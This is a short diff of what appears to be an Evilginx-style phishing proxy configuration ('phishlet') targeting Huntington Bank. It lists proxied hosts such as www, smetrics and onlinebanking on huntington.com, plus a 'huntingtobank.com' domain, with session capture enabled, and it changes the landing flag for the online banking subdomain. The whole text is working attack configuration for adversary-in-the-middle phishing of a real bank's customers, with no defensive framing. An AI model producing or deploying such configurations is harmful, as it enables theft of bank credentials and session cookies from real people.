@@ -5,7 +5,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'huntington.com', session: true, is_landing: true}
   - {phish_sub: 'smetrics', orig_sub: 'smetrics', domain: 'huntington.com', session: true, is_landing: false}
-  - {phish_sub: 'onlinebanking', orig_sub: 'onlinebanking', domain: 'huntington.com', session: true, is_landing: true}
+  - {phish_sub: 'onlinebanking', orig_sub: 'onlinebanking', domain: 'huntington.com', session: true, is_landing: false}
   - {phish_sub: 'ensighten', orig_sub: 'ensighten', domain: 'huntingtobank.com', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'huntington.com', session: true, is_landing: false}
   - {phish_sub: 'ddata', orig_sub: 'ddata', domain: 'huntingtobank.com', session: true, is_landing: false}
